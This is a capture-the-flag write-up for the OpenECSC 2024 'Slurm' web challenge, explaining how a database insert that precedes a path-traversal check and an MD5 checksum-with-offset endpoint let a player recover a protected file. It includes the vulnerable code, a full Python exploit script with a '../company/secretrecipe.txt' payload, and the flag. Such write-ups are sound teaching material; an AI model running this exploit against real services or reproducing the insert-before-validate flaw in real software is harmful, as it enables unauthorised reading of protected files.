---
title: "OpenECSC 2024 Final Round — Slurm"
date: 2024-09-21
draft: false
tags: ["web", "mongodb", "path-traversal", "hash-oracle"]
categories: ["OpenECSC 2024"]
authors: ["Val"]
summary: "Exploiting a race condition in database writes and a checksum oracle to brute-force a secret file character by character."
---

## Introduction

The challenge consists in a basic file upload functionality, as well as having some uploaded files of its own, it uses MongoDB to keep track of which files exist and where and it also has the functionality to get the checksum of a specific file to verify the integrity of it.

![Slurm challenge interface](slurm.png)

## Source Code Analysis

After checking out the app source code, we see that the flag is stored inside the file `secretrecipe.txt` having `ea41c85c-3db0-4ded-aff1-a93994f64d81` as its file id.

The app has multiple protections: direct access to the secret file ID returns 403, and filename checks prevent reading `secretrecipe.txt` through the normal file endpoint.

However, the `/files/<id>/checksum` endpoint returns the MD5 hash of a file's content starting at a given offset — and crucially, it doesn't check the filename like the other endpoint does.

## The attack

### Getting a handler to /company/secretrecipe.txt

The `FileMetadata.write()` method inserts into the database **before** checking for path traversal:

```python
def write(self, collection, content):
    collection.insert_one(vars(self))  # DB write happens first!
    if "./" in self.path:
        raise PathTraversalAttemptDetectedException()  # Too late!
```

This means we can create a DB entry pointing to `../company/secretrecipe.txt` — the write to disk fails, but the database record persists.

### Brute-forcing via checksum oracle

Using the checksum endpoint with varying offsets, we can brute-force each character: if `offset` exceeds the file length, the MD5 is that of an empty string (`d41d8cd98f00b204e9800998ecf8427e`). Starting from a high offset and going backwards, we reconstruct the content letter by letter.

## Exploit

```python
import requests
import hashlib
import string
import json

def put_file():
    URL = "http://slurm.challs.open.ecsc2024.it/api/v1/files/ef411dab-8b8d-45a1-9de4-a9614d533999"
    response = requests.put(URL, json={
        "author": "exploit",
        "filename": "../company/secretrecipe.txt",
        "content": "ez",
        "description": "pwned"
    })

def bruteforce(id):
    ALPHABET = string.ascii_letters + "0123456789_-!{}()?"
    content = ""
    for number in range(50, -1, -1):
        URL = f"http://slurm.challs.open.ecsc2024.it/api/v1/files/{id}/checksum?offset={number}"
        response = json.loads(requests.get(URL).text)
        if response['checksum'] == "":
            continue
        for letter in ALPHABET:
            content = letter + content
            if hashlib.md5(content.encode()).hexdigest() == response['checksum']:
                print(content)
                break
            content = content[1:]

put_file()
bruteforce("ef411dab-8b8d-45a1-9de4-a9614d533999")
```

**Flag:** `openECSC{B377eR_7o_nO7_kNow_7h3_Tru7H_c15eb4b5}`
